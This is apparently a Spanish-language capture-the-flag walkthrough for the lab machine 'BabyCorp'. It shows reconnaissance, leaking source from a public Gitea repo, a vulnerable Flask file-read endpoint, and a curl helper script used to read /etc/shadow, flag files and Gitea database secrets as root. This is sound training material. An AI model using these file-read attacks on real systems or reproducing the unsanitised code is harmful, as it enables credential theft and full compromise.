---
tags: [ctf, thehackerslabs, linux, walkthrough, lfi]
tipo: walkthrough
estado: resuelto
---

# BabyCorp — Walkthrough

> [!note] Cómo leer esta nota
> **comando → salida relevante → interpretación → por qué**. Esta nota reproduce el contenido de [[BabyCorp - Writeup]], reorganizado paso a paso.

## Paso 1 — Reconocimiento

**Comando**
```bash
nmap -sS -sV -p- 192.168.56.102
```

**Salida relevante**
```text
22/tcp   open  ssh     OpenSSH 9.2p1 Debian
3000/tcp open  http    Gitea "BabyCorp" (cookie i_like_gitea)
3306/tcp open  mysql   MariaDB
5000/tcp open  http    Flask / Werkzeug 3.1.8
9000/tcp open  http    servicio custom: "This is almost exactly the same as jump..."
```

**Interpretación / por qué**
- Gitea (`:3000`) es una plataforma de repositorios: primer sitio donde buscar **fuga de código**.

## Paso 2 — Fuga de código desde Gitea

**Comando**
```bash
curl -s "http://192.168.56.102:3000/api/v1/repos/search?limit=50"
git clone http://192.168.56.102:3000/wvverez/BabyCorp-Web-Project.git
```

**Interpretación / por qué**
- El repo `wvverez/BabyCorp-Web-Project` es **público**. Al leer `app.py` aparece el endpoint vulnerable.

## Paso 3 — Identificar el sink (LFI)

**Código vulnerable**
```python
@app.route('/api/load-file', methods=['POST'])
def load_file():
    filename = request.form.get('file', '')
    with open(filename, 'r') as f:   # <-- path traversal total
        content = f.read()
    return jsonify({"success": True, "content": content})
```

**Interpretación / por qué**
- `open(filename, ...)` con entrada del usuario **sin sanitizar** ni autenticar ⇒ cualquier ruta. La respuesta llega en **base64**.

## Paso 4 — Explotación

**Comando**
```bash
curl -s http://192.168.56.102:5000/api/load-file --data-urlencode "file=/etc/passwd"
```

**Helper usado**
```bash
#!/bin/bash
curl -s http://192.168.56.102:5000/api/load-file --data-urlencode "file=$1" \
 | python3 -c "import sys,json,base64; d=json.load(sys.stdin); c=d.get('content'); \
   print(base64.b64decode(c).decode('utf-8','replace') if d.get('encoding')=='base64' and c else (c or d.get('error')))"
```

## Paso 5 — Escalada "gratis" a root

**Comando**
```bash
./lfi.sh /proc/self/cmdline            # /usr/bin/python3 /var/www/html/web/app.py
./lfi.sh /proc/self/status | grep Uid  # Uid: 0 0 0 0
```

**Salida relevante**
```text
Uid:	0	0	0	0
```

**Interpretación / por qué**
- El servicio Flask corre como **root**: el LFI es lectura arbitraria **como root**.

## Paso 6 — Flags y pruebas de acceso

**Comando**
```bash
./lfi.sh /home/dev_wvverez/user.txt    # USER flag
./lfi.sh /root/root.txt                # ADMIN/ROOT flag
./lfi.sh /etc/shadow                   # prueba de acceso root
./lfi.sh /etc/gitea/app.ini            # secretos de DB de Gitea
```

**Usuarios del sistema** (de `/etc/passwd`): `root`, `babydev` (1000), `softwaredepartment` (1001), `git` (102), `dev_wvverez` (1002).

## Qué funcionó

- Buscar **código fuente expuesto** en Gitea.
- Confirmar el **sink** (`open()` sin validación).
- Detectar que el servicio corre como **root**.

## Qué falló (y por qué)

- Nada relevante. El puerto `9000` **no fue necesario**.

## Qué aprendí

- Un repo público = mapa del backend.
- Un servicio web como root convierte un LFI en compromiso total.
